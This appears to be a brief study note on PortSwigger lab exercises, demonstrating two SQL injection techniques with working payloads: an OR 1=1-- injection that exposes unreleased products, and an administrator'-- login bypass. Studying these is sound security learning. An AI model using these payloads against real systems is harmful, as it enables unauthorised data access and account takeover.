# SQL Injections

## Where clause allowing retrieval of data

A SQL injection may start with ' or at least in the burp suite labs the single quote is required.

The where statement is executed succesfully, after injecting the payload the released flag is ignored; this returns all of the products regardless of its' release status.

Code:
<br>`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`<br>
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

Payload:<br>
`filter?category=Gifts'+OR+1=1--`<br>
'+OR+1=1--

Credit:<br>
[SQL retrieve data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

## Login bypass
Explantation:<br>
This payload is a more simple to understand. The username and password are used as variables in the SQL query. <br>If an application does not validiate/sanitize the input an attacker can inject their own SQL and bypass. We bypass the login by removing the password requirement.<br>

Code:<br>
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
<br>`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`<br>
<br>Payload:
<br>`username=administrator%27--&password=hello`<br>
Username field = "adminstrator'--"<br>
<br>Credit:<br>
[SQL Login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
